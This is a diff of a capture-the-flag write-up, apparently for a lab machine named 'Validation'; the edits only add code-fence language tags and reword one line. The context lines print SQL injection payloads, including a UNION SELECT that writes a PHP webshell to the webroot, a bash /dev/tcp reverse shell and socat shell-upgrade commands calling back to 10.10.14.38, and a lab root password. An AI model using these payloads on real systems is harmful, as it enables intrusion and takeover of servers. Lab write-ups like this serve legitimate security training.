@@ -74,7 +74,7 @@ ___
 
 I tried to insert statement that orders results by a specific column meaning it will fail whenever the selected column does not exist. This way I was able to determine number of columns in the table. 
 
-```
+```sql
 ' ORDER BY 2-- //
 ```
 
@@ -83,7 +83,7 @@ This payload resulted in error which means that table does not have 2 columns.
 
 ![orderError.png](/assets/img/Validation/orderError.png)
 
-```
+```sql
 ' ORDER BY 1-- //
 ```
 
@@ -91,7 +91,7 @@ This payload resulted in error which means that table does not have 2 columns.
 
 Missing error message means that our statement was valid and we determined that table has one column. Now that we know number of columns in table we can try to write files on web server via `SELECT INTO_OUTFILE` statement. I will try to write `webshell.php` to `webroot` directory 
 
-```
+```sql
 ' UNION SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/webshell.php" -- //
 ```
 
@@ -107,7 +107,7 @@ Now we can access our `webshell`.
 
 To get reverse shell on system I used URL encoded bash reverse shell. 
 
-```
+```bash
 /bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.38/7003 0>&1"
 ```
 
@@ -126,12 +126,12 @@ After submitting URL encoded payload to `webshell` I received reverse shell conn
 ### Upgrading TTY using socat
 
 On victim machine:
-```
+```bash
 /usr/bin/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.38:4444
 ```
 
 On kali:
-```
+```bash
 socat file:`tty`,raw,echo=0 tcp-listen:4444
 ```
 
@@ -156,7 +156,7 @@ uhc : uhc-9qual-global-pw
 
 ### Logging as root
 
-By using password found in `config.php`, I obtained root access to the system.
+By using password found in `config.php`, I got root access to the system.
 
 ```
 root : uhc-9qual-global-pw
